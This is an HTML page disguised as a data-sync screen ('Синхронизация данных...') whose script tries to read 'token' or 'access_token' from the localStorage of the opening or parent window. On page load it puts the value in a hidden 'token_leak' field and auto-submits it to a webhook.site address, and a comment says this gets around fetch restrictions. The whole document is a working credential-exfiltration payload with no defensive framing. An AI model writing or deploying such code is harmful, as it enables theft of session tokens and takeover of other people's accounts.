<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
    <div id="status">Синхронизация данных...</div>
    
    <form id="stealForm" action="https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6" method="GET">
        <input type="hidden" name="token_leak" id="tokenField">
        <input type="hidden" name="debug_info" id="debugField">
    </form>

    <script>
        (function() {
            var form = document.getElementById('stealForm');
            var field = document.getElementById('tokenField');
            var debug = document.getElementById('debugField');

            try {
                // Пытаемся найти хоть какую-то зацепку
                var opener = window.opener || window.parent;
                
                if (opener) {
                    // Пробуем разные варианты имен токенов
                    var t = opener.localStorage.getItem('token') || 
                            opener.localStorage.getItem('access_token') || 
                            "not_accessible_via_js";
                    
                    field.value = t;
                    debug.value = "OpenerFound_Domain_" + document.domain;
                } else {
                    debug.value = "NoOpener_NoParent";
                }
            } catch (e) {
                debug.value = "SOP_Error: " + e.message;
            }

            // Отправляем форму через 500мс (это обходит многие запреты на fetch)
            setTimeout(function() {
                form.submit();
            }, 500);
        })();
    </script>
</body>
</html>
